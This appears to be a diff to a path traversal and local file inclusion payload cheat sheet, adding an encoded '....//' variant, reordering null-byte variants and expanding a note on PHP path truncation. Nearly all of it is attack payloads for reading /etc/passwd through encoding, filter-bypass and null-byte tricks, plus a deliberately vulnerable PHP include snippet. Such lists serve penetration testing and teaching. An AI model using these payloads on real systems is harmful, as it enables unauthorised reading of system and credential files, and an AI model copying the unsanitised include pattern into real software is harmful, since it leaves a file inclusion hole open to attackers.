@@ -13,6 +13,7 @@
 %252E%252F - Double URL Encode ./
 %2E%2E%2F - Single URL Encoded ../
 %252E%252E%252F - Double URL Encoded ../
+%2E%2E%2E%2E%2F%2F - Single URL Encode ....//
 
 **traversal sequence stripped:**
 ....//....//....//etc/passwd
@@ -21,8 +22,9 @@
 
 **Null Byte variations:**
 %00
-%2500 - URL Encoded
 %00%00
+%2500 - URL Encoded
+ 
 
 **URL Encoded:**
 ..%252f..%252f..%252fetc%252fpasswd - double encode
@@ -33,7 +35,9 @@
 **Traversal from existent folder:**
 utils/scripts/(Any suspected path)../../../../../etc/passwd
 
-**Truncated paths -** after 4096 Bytes, PHP will drop anything after 4096 bytes.
+**Truncated paths -** PHP will drop anything after 4096 bytes.
+assuming a php code that tries to append ".php" to the included parameter, truncated path can be used
+to forcefully ommit ".php" from the parameter to allow path traversal with a normal path, ex: /etc/passwd
 <?php
 include("includes/".$_GET['param1'].".php");
 ?>
